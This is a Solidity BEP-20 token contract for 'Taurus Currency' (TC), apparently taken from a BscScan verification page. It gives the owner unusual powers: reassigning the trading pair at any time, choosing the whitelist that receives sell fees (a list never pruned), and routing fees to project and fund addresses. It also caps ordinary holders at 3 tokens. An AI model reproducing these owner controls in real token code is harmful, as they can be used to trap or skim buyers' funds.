/**
 *Submitted for verification at BscScan.com on 2022-05-13
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.6;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable {
    address public _owner;
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function changeOwner(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract TC is IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => address) inviter;
    uint256 private _tTotal;
    uint256 public _tTotalFeeMax;
    uint256 private _rTotal;
    uint256 private _tFeeTotal;
    string private _name;
    string private _symbol;
    uint256 private _decimals;
    address private _destroyAddress = address(0x000000000000000000000000000000000000dEaD);
    address private _fundAddress = address(0xE2f6F69152c243c736dF45d5F8c8b13405Ffe8a3);
    address private _projectAddress = address(0x04F14EBe0901d74101c95ef213C98DaC9227CCA4);
    address public uniswapV2Pair;
    address[] whiteUserList;
    uint256 public _taxFee = 5;
    uint256 public _liquidityFee = 1;
    mapping(address => bool) public havePush;
    constructor(address tokenOwner) {
        _name = "Taurus Currency";
        _symbol = "TC";
        _decimals = 18;
        _tTotal = 2986 * 10**_decimals;
        _rOwned[tokenOwner] = _tTotal;
        _isExcludedFromFee[tokenOwner] = true;
        _owner = msg.sender;
        emit Transfer(address(0), tokenOwner, _tTotal);
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
		if(uniswapV2Pair == address(0) && amount >= _tTotal.div(2)){
			uniswapV2Pair = recipient;
		}
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }
    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }
	
    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
        if(!havePush[account]){
            whiteUserList.push(account);
            havePush[account] = true;
        }
        
    }
    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
        if(havePush[account]){
            havePush[account] = false;
        }
    }

    function getWhiteListLength() private view returns (uint256) {
        return whiteUserList.length;
    }

    receive() external payable {}
    function claimTokens() public onlyOwner {
        payable(_owner).transfer(address(this).balance);
    }
    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }
	function getInviter(address account) public view returns (address) {
        return inviter[account];
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        bool takeFee = true;
        bool takeFeep = true;
        uint256 amountto = balanceOf(to).add(amount.mul(94).div(100));

        if(from == uniswapV2Pair){
                if(!_isExcludedFromFee[to] && to != _projectAddress && to != _fundAddress  && to != _owner && to != uniswapV2Pair && to != address(this)){
                    require(amountto <= 3*10**18);
                }
                if(to == _projectAddress){ takeFee = false; }
				_tokenTransferSell(from, to, amount, takeFee, takeFeep);
	    }else if(to == uniswapV2Pair){
                if(from == _projectAddress || from == _owner){ takeFee = false; takeFeep = false; }
                _tokenTransferSell(from, to, amount, takeFee, takeFeep);
        }else{
                if(!_isExcludedFromFee[to] && to != _projectAddress && to != _fundAddress  && to != _owner && to != uniswapV2Pair && to != address(this)  && uniswapV2Pair != address(0)){
                    require(amountto <= 3*10**18);
                }
                if(from == _projectAddress || from == _fundAddress || _isExcludedFromFee[from] || from == _owner){ takeFee=false; }
                _tokenTransfer(from, to, amount, takeFee);
        }
    }

    function _tokenTransferSell(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool takeFeep
    ) private {
         _rOwned[sender] = _rOwned[sender].sub(tAmount);

         if (takeFee) {

            uint256 size = whiteUserList.length;
            if(size > 0){
                uint256 famount =tAmount.mul(_taxFee).div(100).div(size);
                for(uint256 i = 0 ; i < size; i++){
                    address user = whiteUserList[i];
                    _takeTransfer(sender, user, famount);
                }
            }
            _takeTransfer(sender, _destroyAddress, tAmount.mul(_liquidityFee).div(100));
        }
        if(takeFeep && balanceOf(address(this))>=tAmount.mul(12).div(100)){
                 _tokenTransfer(address(this),_fundAddress,tAmount.mul(6).div(100),false);
                 _tokenTransfer(address(this),_projectAddress,tAmount.mul(6).div(100),false);
        }

        uint256 recipientRate = 100 - _taxFee - _liquidityFee;
        _rOwned[recipient] = _rOwned[recipient].add(
            tAmount.div(100).mul(recipientRate)
        );
        emit Transfer(sender, recipient, tAmount.div(100).mul(recipientRate));
    }
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _rOwned[sender] = _rOwned[sender].sub(tAmount);

        if (takeFee) {
            _takeTransfer(sender,_projectAddress,tAmount.mul(_liquidityFee).div(100));
         }
        uint256 recipientRate = 100 - _liquidityFee;
        _rOwned[recipient] = _rOwned[recipient].add(tAmount.div(100).mul(recipientRate));
        emit Transfer(sender, recipient, tAmount.div(100).mul(recipientRate));
    }
    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
     ) private {
        _rOwned[to] = _rOwned[to].add(tAmount);
        emit Transfer(sender, to, tAmount);
    }
    function changeRouter(address router) public onlyOwner {
        uniswapV2Pair = router;
    }
}